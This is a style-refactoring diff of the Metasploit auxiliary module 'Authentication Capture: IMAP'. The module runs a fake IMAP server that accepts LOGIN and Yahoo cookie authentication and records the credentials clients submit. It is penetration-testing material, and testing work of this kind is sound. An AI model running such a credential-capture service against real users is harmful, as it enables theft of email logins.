@@ -1,23 +1,22 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
   def initialize
     super(
-      'Name'        => 'Authentication Capture: IMAP',
-      'Description'    => %q{
+      'Name' => 'Authentication Capture: IMAP',
+      'Description' => %q(
         This module provides a fake IMAP service that
       is designed to capture authentication credentials.
-      },
+      ),
       'Author'      => ['ddz', 'hdm'],
       'License'     => MSF_LICENSE,
       'Actions'     =>
@@ -33,8 +32,9 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 143 ])
-      ], self.class)
+        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 143 ])
+      ], self.class
+    )
   end
 
   def setup
@@ -44,11 +44,11 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
-    exploit()
+    exploit
   end
 
   def on_client_connect(c)
-    @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
+    @state[c] = { name: "#{c.peerhost}:#{c.peerport}", ip: c.peerhost, port: c.peerport, user: nil, pass: nil }
     c.put "* OK IMAP4\r\n"
   end
 
@@ -58,17 +58,17 @@ class MetasploitModule < Msf::Auxiliary
     num, cmd, arg = data.strip.split(/\s+/, 3)
     arg ||= ""
 
-    if cmd.upcase == 'CAPABILITY'
-      c.put "* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS " +
-        "MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN UNSELECT " +
-        "QUOTA XLIST XYZZY LOGIN-REFERRALS AUTH=XYMCOOKIE AUTH=XYMCOOKIEB64 " +
-        "AUTH=XYMPKI AUTH=XYMECOOKIE ID\r\n"
+    if cmd.casecmp('CAPABILITY').zero?
+      c.put "* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS " \
+            "MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN UNSELECT " \
+            "QUOTA XLIST XYZZY LOGIN-REFERRALS AUTH=XYMCOOKIE AUTH=XYMCOOKIEB64 " \
+            "AUTH=XYMPKI AUTH=XYMECOOKIE ID\r\n"
       c.put "#{num} OK CAPABILITY completed.\r\n"
     end
 
     # Handle attempt to authenticate using Yahoo's magic cookie
     # Used by iPhones and Zimbra
-    if cmd.upcase == 'AUTHENTICATE' && arg.upcase == 'XYMPKI'
+    if cmd.casecmp('AUTHENTICATE').zero? && arg.casecmp('XYMPKI').zero?
       c.put "+ \r\n"
       cookie1 = c.get_once
       c.put "+ \r\n"
@@ -77,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    if cmd.upcase == 'LOGIN'
+    if cmd.casecmp('LOGIN').zero?
       @state[c][:user], @state[c][:pass] = arg.split(/\s+/, 2)
 
       register_creds(@state[c][:ip], @state[c][:user], @state[c][:pass], 'imap')
@@ -85,7 +85,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    if cmd.upcase == 'LOGOUT'
+    if cmd.casecmp('LOGOUT').zero?
       c.put("* BYE IMAP4rev1 Server logging out\r\n")
       c.put("#{num} OK LOGOUT completed\r\n")
       return
@@ -93,7 +93,7 @@ class MetasploitModule < Msf::Auxiliary
 
     @state[c][:pass] = data.strip
     c.put "#{num} NO LOGIN FAILURE\r\n"
-    return
+    nil
   end
 
   def on_client_close(c)
@@ -113,7 +113,7 @@ class MetasploitModule < Msf::Auxiliary
     # Build credential information
     credential_data = {
       origin_type: :service,
-      module_fullname: self.fullname,
+      module_fullname: fullname,
       private_data: pass,
       private_type: :password,
       username: user,
